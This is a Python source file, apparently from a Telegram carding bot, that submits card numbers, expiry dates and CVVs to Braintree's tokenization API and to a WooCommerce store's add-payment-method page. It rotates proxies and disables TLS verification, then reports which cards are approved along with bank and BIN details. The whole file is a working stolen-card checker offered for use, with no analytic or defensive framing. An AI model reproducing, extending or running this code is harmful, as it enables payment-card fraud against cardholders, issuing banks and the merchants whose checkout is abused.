# p.py
import requests
import re
import base64
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import time
import json
import random
import urllib3
import glob

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
SELECTED_COOKIE_PAIR = None
user = generate_user_agent()

# ... [unchanged code above] ...

def check_card(cc_line):
    select_new_cookie_pair_silent()
    start_time = time.time()
    try:
        domain_url = get_domain_url()
        cookies_2 = get_cookies_2()
        headers = get_headers()
        add_nonce, au = get_new_auth()
        if not add_nonce or not au:
            return (
                "❌ <b>Braintree Auth</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "❌ Authorization failed. Try again later.\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
            )

        n, mm, yy, cvc = cc_line.strip().split('|')
        if not yy.startswith('20'):
            yy = '20' + yy

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'cc600ecf-f0e1-4316-ac29-7ad78aeafccd',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': '10080',
                            'streetAddress': '147 street',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        headers_token = {
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': user
        }
        proxy = get_random_proxy()
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers_token,
            json=json_data,
            proxies=proxy,
            verify=False
        )
        if response.status_code != 200:
            return (
                "❌ <b>Braintree Auth</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"❌ Tokenization failed. Status: {response.status_code}\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
            )
        token = response.json()['data']['tokenizeCreditCard']['token']
        headers_submit = headers.copy()
        headers_submit['content-type'] = 'application/x-www-form-urlencoded'
        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        proxy = get_random_proxy()
        response = requests.post(
            f'{domain_url}/my-account/add-payment-method/',
            cookies=cookies_2,
            headers=headers,
            data=data,
            proxies=proxy,
            verify=False
        )
        elapsed_time = time.time() - start_time
        soup = BeautifulSoup(response.text, 'html.parser')
        error_div = soup.find('div', class_='woocommerce-notices-wrapper')
        message = error_div.get_text(strip=True) if error_div else "❌ Unknown error"

        status, reason, approved = check_status(message)
        bin_info = get_bin_info(n[:6]) or {}

        # New UI format (for bot):
        result = (
            f"{'✅' if approved else '❌'} <b>{status}</b>\n"
            f"<code>{n}|{mm}|{yy}|{cvc}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Gateway:</b> Braintree Auth\n"
            f"<b>Response:</b> {reason}\n"
            f"<b>BIN Info:</b> {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}\n"
            f"<b>Bank:</b> {bin_info.get('bank', 'UNKNOWN')}\n"
            f"<b>Country:</b> {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}\n"
            f"<b>Time:</b> {elapsed_time:.2f}s\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
        )
        # The return contains ALL needed info as text, but we'll parse in chk.py for UI
        return result

    except Exception as e:
        return (
            "❌ <b>Braintree Auth</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"❌ Error: {str(e)}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
        )

# --- UI Helper for chk.py ---

def parse_check_card_result(result_text, default_card="", default_time=""):
    # Extract info from result text, fallback to unknown if missing
    import re
    card = default_card
    status_key = "declined"
    gateway = "Braintree Auth"
    response = ""
    bank = "Unknown Bank"
    country_flag = "🏳️"
    card_type = "Unknown"
    bin_code = "Unknown"
    check_time = default_time
    if "APPROVED" in result_text:
        status_key = "approved"
    elif "DECLINED" in result_text:
        status_key = "declined"
    elif "INSUFFICIENT FUNDS" in result_text.upper():
        status_key = "insufficient_funds"
    # Get response reason line
    match_resp = re.search(r"<b>Response:</b>\s?(.*?)\n", result_text)
    if match_resp:
        response = match_resp.group(1).strip()
    # Get BIN info line
    match_bin = re.search(r"<b>BIN Info:</b>\s?(.*?)\n", result_text)
    if match_bin:
        card_type = match_bin.group(1).strip()
    # Bank
    match_bank = re.search(r"<b>Bank:</b>\s?(.*?)\n", result_text)
    if match_bank:
        bank = match_bank.group(1).strip()
    # Country
    match_country = re.search(r"<b>Country:</b>\s?(.*?)\n", result_text)
    if match_country:
        country_flag = match_country.group(1).strip()
    # BIN (get from card number or from BIN info)
    match_card = re.search(r"<code>(\d{6})", result_text)
    if match_card:
        bin_code = match_card.group(1)
    if not card and match_card:
        card = match_card.group(0)
    # Time
    match_time = re.search(r"<b>Time:</b>\s?([\d\.]+s)", result_text)
    if match_time:
        check_time = match_time.group(1)
    return {
        "card": card,
        "gateway": gateway,
        "status_key": status_key,
        "response": response,
        "bank": bank,
        "country_flag": country_flag,
        "card_type": card_type,
        "bin_code": bin_code,
        "check_time": check_time
    }
